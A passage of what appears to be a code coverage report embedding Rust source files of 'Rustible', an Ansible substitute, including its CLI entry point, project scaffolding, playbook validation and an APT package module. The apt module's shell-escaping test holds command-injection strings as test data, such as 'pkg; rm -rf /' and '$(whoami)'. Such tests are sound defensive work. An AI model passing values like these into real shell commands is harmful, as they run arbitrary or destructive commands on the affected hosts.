Clone)]\npub struct VersionInfo {\n    /// Semantic version string\n    pub version: \u0026'static str,\n    /// Minimum Rust version required\n    pub rust_version: \u0026'static str,\n    /// Target triple for the build\n    pub target: \u0026'static str,\n    /// Build profile (debug or release)\n    pub profile: \u0026'static str,\n}\n\nimpl std::fmt::Display for VersionInfo {\n    fn fmt(\u0026self, f: \u0026mut std::fmt::Formatter\u003c'_\u003e) -\u003e std::fmt::Result {\n        write!(\n            f,\n            \"rustible {} ({}, {})\",\n            self.version, self.target, self.profile\n        )\n    }\n}\n","traces":[{"line":245,"address":[63403914,63400206],"length":1,"stats":{"Line":0}},{"line":246,"address":[44363987],"length":1,"stats":{"Line":1}},{"line":250,"address":[39660870],"length":1,"stats":{"Line":0}},{"line":252,"address":[62163558],"length":1,"stats":{"Line":0}},{"line":253,"address":[39660881],"length":1,"stats":{"Line":1}},{"line":255,"address":[43911184],"length":1,"stats":{"Line":3}},{"line":276,"address":[46135152,46135104],"length":1,"stats":{"Line":1}},{"line":277,"address":[51920167,51920131,51920217,51920881],"length":1,"stats":{"Line":2}},{"line":278,"address":[71413299,71410996,71415609,71415638,71413333,71413408,71408647,71408766,71415729,71411123,71408673,71411025],"length":1,"stats":{"Line":2}},{"line":279,"address":[63404732,63401035],"length":1,"stats":{"Line":3}},{"line":281,"address":[51007992],"length":1,"stats":{"Line":2}}],"covered":8,"coverable":11},{"path":["/","home","artur","Repositories","rustible","src","main.rs"],"content":"//! Rustible - An Ansible substitute written in Rust\n//!\n//! A fast, safe, and modern configuration management and automation tool.\n//!\n//! This is the main entry point for the Rustible CLI.\n\nmod cli;\nmod config;\n\nuse anyhow::Result;\nuse cli::commands::CommandContext;\nuse cli::{Cli, Commands};\nuse config::Config;\nuse tracing_subscriber::{fmt, prelude::*, EnvFilter};\n\n/// Application version information\nconst VERSION: \u0026str = env!(\"CARGO_PKG_VERSION\");\nconst AUTHORS: \u0026str = env!(\"CARGO_PKG_AUTHORS\");\n\n#[tokio::main]\nasync fn main() -\u003e Result\u003c()\u003e {\n    // Parse command line arguments\n    let cli = Cli::parse_args();\n\n    // Initialize logging based on verbosity\n    init_logging(cli.verbosity());\n\n    // Display version if verbose\n    if cli.verbosity() \u003e= 2 {\n        eprintln!(\"Rustible v{} by {}\", VERSION, AUTHORS);\n    }\n\n    // Load configuration\n    let config = Config::load(cli.config.as_ref()).unwrap_or_else(|e| {\n        if cli.verbosity() \u003e= 1 {\n            eprintln!(\"Warning: Failed to load config: {}\", e);\n        }\n        Config::default()\n    });\n\n    // Create command context\n    let mut ctx = CommandContext::new(\u0026cli, config);\n\n    // Execute the appropriate command\n    let exit_code = match \u0026cli.command {\n        Commands::Run(args) =\u003e args.execute(\u0026mut ctx).await?,\n        Commands::Check(args) =\u003e args.execute(\u0026mut ctx).await?,\n        Commands::ListHosts(args) =\u003e args.execute(\u0026mut ctx).await?,\n        Commands::ListTasks(args) =\u003e args.execute(\u0026mut ctx).await?,\n        Commands::Vault(args) =\u003e args.execute(\u0026mut ctx).await?,\n        Commands::Init(args) =\u003e init_project(\u0026args.path, \u0026args.template, \u0026mut ctx).await?,\n        Commands::Validate(args) =\u003e validate_playbook(\u0026args.playbook, \u0026mut ctx).await?,\n    };\n\n    std::process::exit(exit_code);\n}\n\n/// Initialize logging based on verbosity level\nfn init_logging(verbosity: u8) {\n    let filter = match verbosity {\n        0 =\u003e \"warn\",\n        1 =\u003e \"info\",\n        2 =\u003e \"debug\",\n        _ =\u003e \"trace\",\n    };\n\n    let env_filter = EnvFilter::try_from_default_env().unwrap_or_else(|_| EnvFilter::new(filter));\n\n    tracing_subscriber::registry()\n        .with(fmt::layer().with_target(verbosity \u003e= 3))\n        .with(env_filter)\n        .init();\n}\n\n/// Initialize a new Rustible project\nasync fn init_project(\n    path: \u0026std::path::Path,\n    template: \u0026str,\n    ctx: \u0026mut CommandContext,\n) -\u003e Result\u003ci32\u003e {\n    use std::fs;\n\n    ctx.output.banner(\"RUSTIBLE INIT\");\n    ctx.output.info(\u0026format!(\n        \"Initializing Rustible project in: {}\",\n        path.display()\n    ));\n\n    // Ensure the base path exists\n    if !path.exists() {\n        fs::create_dir_all(path)?;\n    }\n\n    // Create directory structure\n    let dirs = [\n        \"inventory\",\n        \"playbooks\",\n        \"roles\",\n        \"group_vars\",\n        \"host_vars\",\n        \"files\",\n        \"templates\",\n    ];\n\n    for dir in \u0026dirs {\n        let dir_path = path.join(dir);\n        if !dir_path.exists() {\n            fs::create_dir_all(\u0026dir_path)?;\n            ctx.output.info(\u0026format!(\"Created: {}/\", dir));\n        }\n    }\n\n    // Create sample inventory\n    let inventory_content = r#\"# Rustible Inventory File\n# Define your hosts and groups here\n\nall:\n  hosts:\n    localhost:\n      ansible_connection: local\n\n  children:\n    webservers:\n      hosts: {}\n    dbservers:\n      hosts: {}\n\"#;\n    let inventory_path = path.join(\"inventory/hosts.yml\");\n    if !inventory_path.exists() {\n        fs::write(\u0026inventory_path, inventory_content)?;\n        ctx.output.info(\"Created: inventory/hosts.yml\");\n    }\n\n    // Create sample playbook based on template\n    let playbook_content = match template {\n        \"webserver\" =\u003e {\n            r#\"---\n# Web Server Playbook\n- name: Configure web servers\n  hosts: webservers\n  r#become: true\n  gather_facts: true\n\n  vars:\n    http_port: 80\n    document_root: /var/www/html\n\n  tasks:\n    - name: Install web server packages\n      package:\n        name:\n          - nginx\n        state: present\n\n    - name: Ensure nginx is running\n      service:\n        name: nginx\n        state: started\n        enabled: true\n\n    - name: Create document root\n      file:\n        path: \"{{ document_root }}\"\n        state: directory\n        mode: '0755'\n\n  handlers:\n    - name: Restart nginx\n      service:\n        name: nginx\n        state: restarted\n\"#\n        }\n        \"docker\" =\u003e {\n            r#\"---\n# Docker Playbook\n- name: Setup Docker\n  hosts: all\n  r#become: true\n  gather_facts: true\n\n  tasks:\n    - name: Install Docker dependencies\n      package:\n        name:\n          - apt-transport-https\n          - ca-certificates\n          - curl\n          - gnupg\n        state: present\n\n    - name: Install Docker\n      package:\n        name: docker.io\n        state: present\n\n    - name: Ensure Docker is running\n      service:\n        name: docker\n        state: started\n        enabled: true\n\n    - name: Add user to docker group\n      user:\n        name: \"{{ ansible_user }}\"\n        groups: docker\n        append: true\n\"#\n        }\n        _ =\u003e {\n            r#\"---\n# Sample Rustible Playbook\n- name: Sample playbook\n  hosts: localhost\n  gather_facts: true\n\n  vars:\n    greeting: \"Hello from Rustible!\"\n\n  tasks:\n    - name: Print greeting message\n      debug:\n        msg: \"{{ greeting }}\"\n\n    - name: Gather system information\n      debug:\n        msg: \"Running on {{ ansible_os_family }} {{ ansible_distribution_version }}\"\n      when: ansible_os_family is defined\n\n    - name: Create a test file\n      file:\n        path: /tmp/rustible_test\n        state: touch\n        mode: '0644'\n\"#\n        }\n    };\n\n    let playbook_path = path.join(\"playbooks/site.yml\");\n    if !playbook_path.exists() {\n        fs::write(\u0026playbook_path, playbook_content)?;\n        ctx.output.info(\"Created: playbooks/site.yml\");\n    }\n\n    // Create config file\n    let config_content = r#\"# Rustible Configuration File\n# This file uses TOML format\n\n[defaults]\ninventory = \"inventory/hosts.yml\"\nforks = 5\ntimeout = 30\ngathering = true\nhost_key_checking = true\nretry_files_enabled = false\n\n[ssh]\npipelining = true\nretries = 3\n\n[privilege_escalation]\nbecome = false\nbecome_method = \"sudo\"\nbecome_user = \"root\"\n\n[colors]\nenabled = true\nok = \"green\"\nchanged = \"yellow\"\nerror = \"red\"\nskipped = \"cyan\"\n\n[logging]\nlog_level = \"info\"\nlog_timestamp = true\n\"#;\n    let config_path = path.join(\"rustible.cfg\");\n    if !config_path.exists() {\n        fs::write(\u0026config_path, config_content)?;\n        ctx.output.info(\"Created: rustible.cfg\");\n    }\n\n    // Create .gitignore\n    let gitignore_content = r#\"# Rustible\n*.retry\n.vault_pass\n*.pyc\n__pycache__/\n\n# Editor\n*.swp\n*.swo\n*~\n.idea/\n.vscode/\n\n# OS\n.DS_Store\nThumbs.db\n\"#;\n    let gitignore_path = path.join(\".gitignore\");\n    if !gitignore_path.exists() {\n        fs::write(\u0026gitignore_path, gitignore_content)?;\n        ctx.output.info(\"Created: .gitignore\");\n    }\n\n    ctx.output.section(\"Project initialized successfully!\");\n    ctx.output.info(\u0026format!(\"Template: '{}'\", template));\n    ctx.output\n        .info(\"Run 'rustible run playbooks/site.yml' to test your setup.\");\n\n    Ok(0)\n}\n\n/// Validate a playbook\nasync fn validate_playbook(playbook: \u0026std::path::Path, ctx: \u0026mut CommandContext) -\u003e Result\u003ci32\u003e {\n    ctx.output.banner(\"PLAYBOOK VALIDATION\");\n    ctx.output\n        .info(\u0026format!(\"Validating: {}\", playbook.display()));\n\n    if !playbook.exists() {\n        ctx.output\n            .error(\u0026format!(\"Playbook not found: {}\", playbook.display()));\n        return Ok(1);\n    }\n\n    // Read and parse the playbook\n    let content = std::fs::read_to_string(playbook)?;\n\n    match serde_yaml::from_str::\u003cserde_yaml::Value\u003e(\u0026content) {\n        Ok(value) =\u003e {\n            // Basic structure validation\n            if let Some(plays) = value.as_sequence() {\n                let mut errors = 0;\n                let mut warnings = 0;\n\n                for (i, play) in plays.iter().enumerate() {\n                    let play_num = i + 1;\n                    let play_name = play\n                        .get(\"name\")\n                        .and_then(|n| n.as_str())\n                        .unwrap_or(\"unnamed\");\n\n                    ctx.output\n                        .debug(\u0026format!(\"Validating play {}: {}\", play_num, play_name));\n\n                    // Check required 'hosts' field\n                    if play.get(\"hosts\").is_none() {\n                        ctx.output.error(\u0026format!(\n                            \"Play {} '{}': missing required 'hosts' field\",\n                            play_num, play_name\n                        ));\n                        errors += 1;\n                    }\n\n                    // Check for tasks or roles\n                    let has_tasks = play.get(\"tasks\").is_some();\n                    let has_roles = play.get(\"roles\").is_some();\n                    let has_pre_tasks = play.get(\"pre_tasks\").is_some();\n                    let has_post_tasks = play.get(\"post_tasks\").is_some();\n\n                    if !has_tasks \u0026\u0026 !has_roles \u0026\u0026 !has_pre_tasks \u0026\u0026 !has_post_tasks {\n                        ctx.output.warning(\u0026format!(\n                            \"Play {} '{}': no tasks, roles, pre_tasks, or post_tasks defined\",\n                            play_num, play_name\n                        ));\n                        warnings += 1;\n                    }\n\n                    // Validate tasks\n                    if let Some(tasks) = play.get(\"tasks\").and_then(|t| t.as_sequence()) {\n                        for (j, task) in tasks.iter().enumerate() {\n                            let task_name = task\n                                .get(\"name\")\n                                .and_then(|n| n.as_str())\n                                .unwrap_or(\"unnamed\");\n\n                            // Check that task has at least one module\n                            let has_module = task.as_mapping().map_or(false, |m| {\n                                m.keys().any(|k| {\n                                    let key = k.as_str().unwrap_or(\"\");\n                                    !matches!(\n                                        key,\n                                        \"name\"\n                                            | \"when\"\n                                            | \"tags\"\n                                            | \"register\"\n                                            | \"ignore_errors\"\n                                            | \"become\"\n                                            | \"become_user\"\n                                            | \"delegate_to\"\n                                            | \"notify\"\n                                            | \"loop\"\n                                            | \"with_items\"\n                                            | \"vars\"\n                                    )\n                                })\n                            });\n\n                            if !has_module {\n                                ctx.output.warning(\u0026format!(\n                                    \"Task {} in play {}: '{}' has no module defined\",\n                                    j + 1,\n                                    play_num,\n                                    task_name\n                                ));\n                                warnings += 1;\n                            }\n                        }\n                    }\n\n                    // Validate handlers\n                    if let Some(handlers) = play.get(\"handlers\").and_then(|h| h.as_sequence()) {\n                        for (j, handler) in handlers.iter().enumerate() {\n                            if handler.get(\"name\").is_none() {\n                                ctx.output.warning(\u0026format!(\n                                    \"Handler {} in play {}: missing 'name' field\",\n                                    j + 1,\n                                    play_num\n                                ));\n                                warnings += 1;\n                            }\n                        }\n                    }\n                }\n\n                // Print summary\n                ctx.output.section(\"Validation Results\");\n\n                if errors == 0 \u0026\u0026 warnings == 0 {\n                    ctx.output\n                        .info(\"Playbook syntax is valid. No issues found.\");\n                    Ok(0)\n                } else if errors == 0 {\n                    ctx.output\n                        .warning(\u0026format!(\"Playbook is valid with {} warning(s)\", warnings));\n                    Ok(0)\n                } else {\n                    ctx.output.error(\u0026format!(\n                        \"Playbook has {} error(s) and {} warning(s)\",\n                        errors, warnings\n                    ));\n                    Ok(1)\n                }\n            } else {\n                ctx.output.error(\"Playbook must be a list of plays\");\n                Ok(1)\n            }\n        }\n        Err(e) =\u003e {\n            ctx.output.error(\u0026format!(\"YAML parse error: {}\", e));\n            Ok(1)\n        }\n    }\n}\n\n#[cfg(test)]\nmod tests {\n    use super::*;\n\n    #[test]\n    fn test_version() {\n        assert!(!VERSION.is_empty());\n    }\n}\n","traces":[],"covered":0,"coverable":0},{"path":["/","home","artur","Repositories","rustible","src","modules","apt.rs"],"content":"//! Apt module - Debian/Ubuntu package management\n//!\n//! This module manages packages using the APT package manager on Debian-based systems.\n//! It supports installing, removing, and upgrading packages, as well as updating the package cache.\n\nuse super::{\n    Diff, Module, ModuleClassification, ModuleContext, ModuleError, ModuleOutput, ModuleParams,\n    ModuleResult, ParallelizationHint, ParamExt,\n};\nuse crate::connection::ExecuteOptions;\nuse std::collections::HashMap;\n\n/// Desired state for a package\n#[derive(Debug, Clone, PartialEq)]\npub enum AptState {\n    Present,\n    Absent,\n    Latest,\n}\n\nimpl AptState {\n    fn from_str(s: \u0026str) -\u003e ModuleResult\u003cSelf\u003e {\n        match s.to_lowercase().as_str() {\n            \"present\" | \"installed\" =\u003e Ok(AptState::Present),\n            \"absent\" | \"removed\" =\u003e Ok(AptState::Absent),\n            \"latest\" =\u003e Ok(AptState::Latest),\n            _ =\u003e Err(ModuleError::InvalidParameter(format!(\n                \"Invalid state '{}'. Valid states: present, absent, latest\",\n                s\n            ))),\n        }\n    }\n}\n\n/// Module for APT package management\npub struct AptModule;\n\nimpl AptModule {\n    /// Build execution options with become/sudo if needed\n    fn build_exec_options(context: \u0026ModuleContext) -\u003e ExecuteOptions {\n        let mut options = ExecuteOptions::new();\n\n        if context.r#become {\n            options.escalate = true;\n            options.escalate_user = context\n                .become_user\n                .clone()\n                .or_else(|| Some(\"root\".to_string()));\n            options.escalate_method = context.become_method.clone();\n        }\n\n        if let Some(ref work_dir) = context.work_dir {\n            options = options.with_cwd(work_dir);\n        }\n\n        options\n    }\n\n    /// Check if a package is installed using dpkg via remote connection\n    async fn is_package_installed_remote(\n        conn: \u0026(dyn crate::connection::Connection + Send + Sync),\n        package: \u0026str,\n        options: Option\u003cExecuteOptions\u003e,\n    ) -\u003e ModuleResult\u003cbool\u003e {\n        let cmd = format!(\n            \"dpkg -s {} 2\u003e/dev/null | grep -q '^Status:.*installed'\",\n            shell_escape(package)\n        );\n        match conn.execute(\u0026cmd, options).await {\n            Ok(result) =\u003e Ok(result.success),\n            Err(_) =\u003e Ok(false),\n        }\n    }\n\n    /// Get installed package version via remote connection\n    async fn get_installed_version_remote(\n        conn: \u0026(dyn crate::connection::Connection + Send + Sync),\n        package: \u0026str,\n        options: Option\u003cExecuteOptions\u003e,\n    ) -\u003e ModuleResult\u003cOption\u003cString\u003e\u003e {\n        let cmd = format!(\n            \"dpkg-query -W -f='${{Version}}' {} 2\u003e/dev/null\",\n            shell_escape(package)\n        );\n        match conn.execute(\u0026cmd, options).await {\n            Ok(result) if result.success =\u003e {\n                let version = result.stdout.trim().to_string();\n                if version.is_empty() {\n                    Ok(None)\n                } else {\n                    Ok(Some(version))\n                }\n            }\n            _ =\u003e Ok(None),\n        }\n    }\n\n    /// Update the apt cache via remote connection\n    async fn update_cache_remote(\n        conn: \u0026(dyn crate::connection::Connection + Send + Sync),\n        options: Option\u003cExecuteOptions\u003e,\n    ) -\u003e ModuleResult\u003c()\u003e {\n        let cmd = \"apt-get update\";\n        let result = conn.execute(cmd, options).await.map_err(|e| {\n            ModuleError::ExecutionFailed(format!(\"Failed to update apt cache: {}\", e))\n        })?;\n\n        if !result.success {\n            return Err(ModuleError::ExecutionFailed(format!(\n                \"Failed to update apt cache: {}\",\n                result.stderr\n            )));\n        }\n\n        Ok(())\n    }\n\n    /// Install packages via remote connection\n    async fn install_packages_remote(\n        conn: \u0026(dyn crate::connection::Connection + Send + Sync),\n        packages: \u0026[String],\n        options: Option\u003cExecuteOptions\u003e,\n    ) -\u003e ModuleResult\u003c()\u003e {\n        let pkg_list: Vec\u003cString\u003e = packages.iter().map(|p| shell_escape(p)).collect();\n        let cmd = format!(\n            \"DEBIAN_FRONTEND=noninteractive apt-get install -y {}\",\n            pkg_list.join(\" \")\n        );\n\n        let result = conn.execute(\u0026cmd, options).await.map_err(|e| {\n            ModuleError::ExecutionFailed(format!(\"Failed to install packages: {}\", e))\n        })?;\n\n        if !result.success {\n            return Err(ModuleError::ExecutionFailed(format!(\n                \"Failed to install packages: {}\",\n                result.stderr\n            )));\n        }\n\n        Ok(())\n    }\n\n    /// Remove packages via remote connection\n    async fn remove_packages_remote(\n        conn: \u0026(dyn crate::connection::Connection + Send + Sync),\n        packages: \u0026[String],\n        options: Option\u003cExecuteOptions\u003e,\n    ) -\u003e ModuleResult\u003c()\u003e {\n        let pkg_list: Vec\u003cString\u003e = packages.iter().map(|p| shell_escape(p)).collect();\n        let cmd = format!(\n            \"DEBIAN_FRONTEND=noninteractive apt-get remove -y {}\",\n            pkg_list.join(\" \")\n        );\n\n        let result = conn.execute(\u0026cmd, options).await.map_err(|e| {\n            ModuleError::ExecutionFailed(format!(\"Failed to remove packages: {}\", e))\n        })?;\n\n        if !result.success {\n            return Err(ModuleError::ExecutionFailed(format!(\n                \"Failed to remove packages: {}\",\n                result.stderr\n            )));\n        }\n\n        Ok(())\n    }\n\n    /// Upgrade packages to latest version via remote connection\n    async fn upgrade_packages_remote(\n        conn: \u0026(dyn crate::connection::Connection + Send + Sync),\n        packages: \u0026[String],\n        options: Option\u003cExecuteOptions\u003e,\n    ) -\u003e ModuleResult\u003c()\u003e {\n        let pkg_list: Vec\u003cString\u003e = packages.iter().map(|p| shell_escape(p)).collect();\n        let cmd = format!(\n            \"DEBIAN_FRONTEND=noninteractive apt-get install --only-upgrade -y {}\",\n            pkg_list.join(\" \")\n        );\n\n        let result = conn.execute(\u0026cmd, options).await.map_err(|e| {\n            ModuleError::ExecutionFailed(format!(\"Failed to upgrade packages: {}\", e))\n        })?;\n\n        if !result.success {\n            return Err(ModuleError::ExecutionFailed(format!(\n                \"Failed to upgrade packages: {}\",\n                result.stderr\n            )));\n        }\n\n        Ok(())\n    }\n}\n\nimpl Module for AptModule {\n    fn name(\u0026self) -\u003e \u0026'static str {\n        \"apt\"\n    }\n\n    fn description(\u0026self) -\u003e \u0026'static str {\n        \"Manage packages with the APT package manager\"\n    }\n\n    fn classification(\u0026self) -\u003e ModuleClassification {\n        ModuleClassification::RemoteCommand\n    }\n\n    fn parallelization_hint(\u0026self) -\u003e ParallelizationHint {\n        // APT uses locks - only one can run per host at a time\n        ParallelizationHint::HostExclusive\n    }\n\n    fn required_params(\u0026self) -\u003e \u0026[\u0026'static str] {\n        \u0026[\"name\"]\n    }\n\n    fn execute(\n        \u0026self,\n        params: \u0026ModuleParams,\n        context: \u0026ModuleContext,\n    ) -\u003e ModuleResult\u003cModuleOutput\u003e {\n        // Get packages - can be a single package or a list\n        let packages: Vec\u003cString\u003e = if let Some(names) = params.get_vec_string(\"name\")? {\n            names\n        } else {\n            vec![params.get_string_required(\"name\")?]\n        };\n\n        let state_str = params\n            .get_string(\"state\")?\n            .unwrap_or_else(|| \"present\".to_string());\n        let state = AptState::from_str(\u0026state_str)?;\n        let update_cache = params.get_bool_or(\"update_cache\", false);\n\n        // Get connection from context\n        let conn = context.connection.as_ref().ok_or_else(|| {\n            ModuleError::ExecutionFailed(\n                \"No connection available in context. APT module requires a remote connection.\"\n                    .to_string(),\n            )\n        })?;\n\n        // Build execution options with become/sudo\n        let exec_options = Self::build_exec_options(context);\n\n        // Use tokio runtime to execute async operations\n        let result = tokio::task::block_in_place(|| {\n            tokio::runtime::Handle::current().block_on(async {\n                // Update cache if requested\n                if update_cache \u0026\u0026 !context.check_mode {\n                    Self::update_cache_remote(conn.as_ref(), Some(exec_options.clone())).await?;\n                }\n\n                // Track what we'll do\n                let mut to_install: Vec\u003cString\u003e = Vec::new();\n                let mut to_remove: Vec\u003cString\u003e = Vec::new();\n                let mut to_upgrade: Vec\u003cString\u003e = Vec::new();\n                let mut already_ok: Vec\u003cString\u003e = Vec::new();\n\n                // Check current state of packages\n                for package in \u0026packages {\n                    let is_installed = Self::is_package_installed_remote(\n                        conn.as_ref(),\n                        package,\n                        Some(exec_options.clone()),\n                    )\n                    .await?;\n\n                    match state {\n                        AptState::Present =\u003e {\n                            if is_installed {\n                                already_ok.push(package.clone());\n                            } else {\n                                to_install.push(package.clone());\n                            }\n                        }\n                        AptState::Absent =\u003e {\n                            if is_installed {\n                                to_remove.push(package.clone());\n                            } else {\n                                already_ok.push(package.clone());\n                            }\n                        }\n                        AptState::Latest =\u003e {\n                            if is_installed {\n                                to_upgrade.push(package.clone());\n                            } else {\n                                to_install.push(package.clone());\n                            }\n                        }\n                    }\n                }\n\n                // Check mode - return what would happen\n                if context.check_mode {\n                    if to_install.is_empty() \u0026\u0026 to_remove.is_empty() \u0026\u0026 to_upgrade.is_empty() {\n                        return Ok(ModuleOutput::ok(format!(\n                            \"All packages already in desired state: {}\",\n                            already_ok.join(\", \")\n                        )));\n                    }\n\n                    let mut msg = String::new();\n                    if !to_install.is_empty() {\n                        msg.push_str(\u0026format!(\"Would install: {}. \", to_install.join(\", \")));\n                    }\n                    if !to_remove.is_empty() {\n                        msg.push_str(\u0026format!(\"Would remove: {}. \", to_remove.join(\", \")));\n                    }\n                    if !to_upgrade.is_empty() {\n                        msg.push_str(\u0026format!(\"Would upgrade: {}. \", to_upgrade.join(\", \")));\n                    }\n\n                    return Ok(ModuleOutput::changed(msg.trim().to_string()));\n                }\n\n                // Perform the actual operations\n                let mut changed = false;\n                let mut results: HashMap\u003cString, String\u003e = HashMap::new();\n\n                if !to_install.is_empty() {\n                    Self::install_packages_remote(\n                        conn.as_ref(),\n                        \u0026to_install,\n                        Some(exec_options.clone()),\n                    )\n                    .await?;\n                    changed = true;\n                    for pkg in \u0026to_install {\n                        results.insert(pkg.clone(), \"installed\".to_string());\n                    }\n                }\n\n                if !to_upgrade.is_empty() {\n                    Self::upgrade_packages_remote(\n                        conn.as_ref(),\n                        \u0026to_upgrade,\n                        Some(exec_options.clone()),\n                    )\n                    .await?;\n                    changed = true;\n                    for pkg in \u0026to_upgrade {\n                        results.insert(pkg.clone(), \"upgraded\".to_string());\n                    }\n                }\n\n                if !to_remove.is_empty() {\n                    Self::remove_packages_remote(\n                        conn.as_ref(),\n                        \u0026to_remove,\n                        Some(exec_options.clone()),\n                    )\n                    .await?;\n                    changed = true;\n                    for pkg in \u0026to_remove {\n                        results.insert(pkg.clone(), \"removed\".to_string());\n                    }\n                }\n\n                for pkg in \u0026already_ok {\n                    results.insert(pkg.clone(), \"ok\".to_string());\n                }\n\n                if changed {\n                    let mut msg = String::new();\n                    if !to_install.is_empty() {\n                        msg.push_str(\u0026format!(\"Installed: {}. \", to_install.join(\", \")));\n                    }\n                    if !to_upgrade.is_empty() {\n                        msg.push_str(\u0026format!(\"Upgraded: {}. \", to_upgrade.join(\", \")));\n                    }\n                    if !to_remove.is_empty() {\n                        msg.push_str(\u0026format!(\"Removed: {}. \", to_remove.join(\", \")));\n                    }\n\n                    Ok(ModuleOutput::changed(msg.trim().to_string())\n                        .with_data(\"results\", serde_json::json!(results)))\n                } else {\n                    Ok(\n                        ModuleOutput::ok(\"All packages already in desired state\".to_string())\n                            .with_data(\"results\", serde_json::json!(results)),\n                    )\n                }\n            })\n        });\n\n        result\n    }\n\n    fn check(\u0026self, params: \u0026ModuleParams, context: \u0026ModuleContext) -\u003e ModuleResult\u003cModuleOutput\u003e {\n        let check_context = ModuleContext {\n            check_mode: true,\n            ..context.clone()\n        };\n        self.execute(params, \u0026check_context)\n    }\n\n    fn diff(\u0026self, params: \u0026ModuleParams, context: \u0026ModuleContext) -\u003e ModuleResult\u003cOption\u003cDiff\u003e\u003e {\n        let packages: Vec\u003cString\u003e = if let Some(names) = params.get_vec_string(\"name\")? {\n            names\n        } else {\n            vec![params.get_string_required(\"name\")?]\n        };\n\n        let state_str = params\n            .get_string(\"state\")?\n            .unwrap_or_else(|| \"present\".to_string());\n        let state = AptState::from_str(\u0026state_str)?;\n\n        // Get connection from context\n        let conn = match context.connection.as_ref() {\n            Some(c) =\u003e c,\n            None =\u003e {\n                // No connection available, return basic diff without checking remote state\n                let mut before_lines = Vec::new();\n                let mut after_lines = Vec::new();\n\n                for package in \u0026packages {\n                    match state {\n                        AptState::Present | AptState::Latest =\u003e {\n                            before_lines.push(format!(\"{}: (unknown)\", package));\n                            after_lines.push(format!(\"{}: (will be installed/updated)\", package));\n                        }\n                        AptState::Absent =\u003e {\n                            before_lines.push(format!(\"{}: (unknown)\", package));\n                            after_lines.push(format!(\"{}: (will be removed)\", package));\n                        }\n                    }\n                }\n\n                return Ok(Some(Diff::new(\n                    before_lines.join(\"\\n\"),\n                    after_lines.join(\"\\n\"),\n                )));\n            }\n        };\n\n        let exec_options = Self::build_exec_options(context);\n\n        let result = tokio::task::block_in_place(|| {\n            tokio::runtime::Handle::current().block_on(async {\n                let mut before_lines = Vec::new();\n                let mut after_lines = Vec::new();\n\n                for package in \u0026packages {\n                    let is_installed = Self::is_package_installed_remote(\n                        conn.as_ref(),\n                        package,\n                        Some(exec_options.clone()),\n                    )\n                    .await?;\n\n                    let version = Self::get_installed_version_remote(\n                        conn.as_ref(),\n                        package,\n                        Some(exec_options.clone()),\n                    )\n                    .await?\n                    .unwrap_or_default();\n\n                    match state {\n                        AptState::Present =\u003e {\n                            if is_installed {\n                                before_lines.push(format!(\"{}: {}\", package, version));\n                                after_lines.push(format!(\"{}: {}\", package, version));\n                            } else {\n                                before_lines.push(format!(\"{}: (not installed)\", package));\n                                after_lines.push(format!(\"{}: (will be installed)\", package));\n                            }\n                        }\n                        AptState::Absent =\u003e {\n                            if is_installed {\n                                before_lines.push(format!(\"{}: {}\", package, version));\n                                after_lines.push(format!(\"{}: (will be removed)\", package));\n                            } else {\n                                before_lines.push(format!(\"{}: (not installed)\", package));\n                                after_lines.push(format!(\"{}: (not installed)\", package));\n                            }\n                        }\n                        AptState::Latest =\u003e {\n                            if is_installed {\n                                before_lines.push(format!(\"{}: {}\", package, version));\n                                after_lines.push(format!(\"{}: (will be upgraded)\", package));\n                            } else {\n                                before_lines.push(format!(\"{}: (not installed)\", package));\n                                after_lines.push(format!(\"{}: (will be installed)\", package));\n                            }\n                        }\n                    }\n                }\n\n                Ok(Some(Diff::new(\n                    before_lines.join(\"\\n\"),\n                    after_lines.join(\"\\n\"),\n                )))\n            })\n        });\n\n        result\n    }\n}\n\n#[cfg(test)]\nmod tests {\n    use super::*;\n\n    #[test]\n    fn test_apt_state_from_str() {\n        assert_eq!(AptState::from_str(\"present\").unwrap(), AptState::Present);\n        assert_eq!(AptState::from_str(\"installed\").unwrap(), AptState::Present);\n        assert_eq!(AptState::from_str(\"absent\").unwrap(), AptState::Absent);\n        assert_eq!(AptState::from_str(\"removed\").unwrap(), AptState::Absent);\n        assert_eq!(AptState::from_str(\"latest\").unwrap(), AptState::Latest);\n        assert!(AptState::from_str(\"invalid\").is_err());\n    }\n\n    #[test]\n    fn test_apt_module_name() {\n        let module = AptModule;\n        assert_eq!(module.name(), \"apt\");\n    }\n\n    #[test]\n    fn test_apt_module_classification() {\n        let module = AptModule;\n        assert_eq!(module.classification(), ModuleClassification::RemoteCommand);\n    }\n\n    #[test]\n    fn test_apt_module_parallelization() {\n        let module = AptModule;\n        assert_eq!(\n            module.parallelization_hint(),\n            ParallelizationHint::HostExclusive\n        );\n    }\n\n    #[test]\n    fn test_apt_module_required_params() {\n        let module = AptModule;\n        assert_eq!(module.required_params(), \u0026[\"name\"]);\n    }\n\n    // Integration tests would require actual apt access\n    // These are unit tests for the parsing/configuration logic\n\n    #[test]\n    fn test_shell_escape() {\n        assert_eq!(shell_escape(\"simple\"), \"simple\");\n        assert_eq!(shell_escape(\"nginx\"), \"nginx\");\n        assert_eq!(shell_escape(\"with space\"), \"'with space'\");\n        assert_eq!(shell_escape(\"with'quote\"), \"'with'\\\\''quote'\");\n        assert_eq!(shell_escape(\"pkg; rm -rf /\"), \"'pkg; rm -rf /'\");\n        assert_eq!(shell_escape(\"$(whoami)\"), \"'$(whoami)'\");\n        assert_eq!(shell_escape(\"`id`\"), \"'`id`'\");\n    }\n}\n\n/// Escape a string for safe use in shell commands\nfn shell_escape(s: \u0026str) -\u003e String {\n    // Simple escape: wrap in single quotes and escape any single quotes\n    if s.chars()\n        .all(|c| c.is_alphanumeric() || c == '_' || c == '-' || c == '.' || c == '/' || c == '+')\n    {\n        s.to_string()\n    } else {\n        format!(\"'{}'\", s.replace('\\'', \"'\\\\''\"))\n    